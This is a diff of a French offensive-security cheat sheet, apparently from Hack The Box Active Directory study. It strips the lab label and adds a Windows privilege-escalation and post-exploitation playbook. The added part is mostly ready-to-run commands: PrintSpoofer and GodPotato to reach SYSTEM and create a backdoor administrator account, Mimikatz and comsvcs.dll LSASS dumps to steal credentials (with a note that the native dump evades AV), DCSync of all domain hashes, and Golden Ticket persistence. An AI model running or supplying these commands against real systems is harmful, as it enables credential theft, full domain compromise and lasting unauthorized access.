@@ -1,4 +1,4 @@
-# Fiche — Exploitation de GenericAll sur un DC (HTB / AD)
+# Exploitation de GenericAll sur un DC 
 
 > **Contexte** : compte SPN compromis → membre du groupe `BENE GESSERIT` → `GenericAll` sur `ARRAKIS.IMPERIUM.LOCAL` (DC)
 
@@ -220,8 +220,148 @@ Même logique que Shadow Credentials : `ARRAKIS$` est un DC avec les droits de r
 |`secretsdump.py` (impacket)|DCSync / dump NTDS.dit|
 |`addcomputer.py` (impacket)|Création compte machine|
 
+# # Windows — Privilege Escalation & Post-Exploitation
+
+
+## 1. Reconnaissance initiale (dès l'obtention d'un shell)
+
+```cmd
+whoami /all          ; compte, groupes, privilèges
+systeminfo           ; OS, domaine, hotfixes
+ipconfig /all        ; réseau, DNS (→ souvent pointe vers le DC)
+net user             ; comptes locaux
+net localgroup administrators
+net group "Domain Admins" /domain
+nltest /dclist:<domain>
+echo %logonserver%
+```
+
+**Ce qu'on cherche :**
+
+- `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` → Potato attacks
+- Compte de service IIS/SQL → souvent surprivilégié
+- Admins locaux qui sont aussi comptes de domaine
+
 ---
 
-## Tags
+## 2. Privilege Escalation — SeImpersonatePrivilege
 
-`#activedirectory` `#htb` `#kerberos` `#genericall` `#rbcd` `#shadowcredentials` `#dcsync` `#pentest`
+> Cas typique : shell IIS (`IIS AppPool\DefaultAppPool`), SQL Server, etc.
+
+### Outil recommandé selon l'OS
+
+|OS|Outil|
+|---|---|
+|Windows Server 2019 / Win 10+|**PrintSpoofer** ou **GodPotato**|
+|Windows Server 2016 / Win 8-10|**JuicyPotato**|
+|Tous|**GodPotato** (le plus universel)|
+
+### PrintSpoofer
+
+```cmd
+PrintSpoofer64.exe -i -c "cmd.exe"
+PrintSpoofer64.exe -i -c "whoami"
+; Objectif : obtenir NT AUTHORITY\SYSTEM
+```
+
+### GodPotato
+
+```cmd
+GodPotato.exe -cmd "cmd /c whoami"
+GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
+```
+
+**Upload via SMB** si accès au webroot :
+
+ ```bash
+ smbclient //<IP>/<share> -U "guest" --no-pass
+ put PrintSpoofer64.exe
+ put mimikatz.exe
+ ```
+
+---
+
+## 3. Dump de credentials avec Mimikatz
+
+> Nécessite un shell **SYSTEM** ou **Administrator** avec `privilege::debug`
+
+### Commandes principales
+
+```cmd
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+```
+
+### Ce que chaque module donne
+
+|Module|Résultat|
+|---|---|
+|`sekurlsa::logonpasswords`|Hash NTLM + passwords en clair des sessions actives|
+|`lsadump::sam`|Hashes des comptes locaux (SAM)|
+|`lsadump::dcsync /domain:<dom> /all`|Tous les hashes du domaine (depuis un DA)|
+|`sekurlsa::tickets`|Tickets Kerberos en mémoire|
+|`kerberos::list /export`|Export des tickets .kirbi|
+
+### Méthode alternative si AV bloque mimikatz — dump LSASS natif
+
+```cmd
+; Récupérer le PID de lsass
+tasklist | findstr lsass
+
+; Dump avec comsvcs.dll (100% natif Windows, non détecté)
+rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\windows\temp\lsass.dmp full
+```
+
+Puis analyser depuis Exegol :
+
+```bash
+pypykatz lsa minidump lsass.dmp
+```
+
+---
+
+## 5. Post-exploitation DC — DCSync
+
+Une fois admin sur le DC, dump de **tous les hashes du domaine** :
+
+```bash
+impacket-secretsdump -hashes :<NThash> <DOMAIN>/<user>@<DC_IP>
+
+; Ou depuis un shell sur le DC avec mimikatz :
+mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv" "exit"
+
+; Hash krbtgt uniquement (pour Golden Ticket) :
+mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" "exit"
+```
+
+---
+
+## 6. Persistance — Golden Ticket
+
+Avec le hash de `krbtgt` :
+
+```cmd
+; Dans mimikatz sur le DC
+kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt
+; /ptt = inject directement en mémoire
+
+; Vérifier
+klist
+```
+
+Depuis Exegol :
+
+```bash
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass <domain>/Administrator@<DC_hostname>
+```
+
+---
+
+## Références
+
+- [PrintSpoofer — itm4n](https://github.com/itm4n/PrintSpoofer)
+- [GodPotato](https://github.com/BeichenDream/GodPotato)
+- [Mimikatz — gentilkiwi](https://github.com/gentilkiwi/mimikatz)
+- [Impacket](https://github.com/fortra/impacket)
+- [HackTricks — SeImpersonatePrivilege](https://book.hacktricks.xyz/windows-hardening/privilege-escalation/privilege-escalation-abusing-tokens)
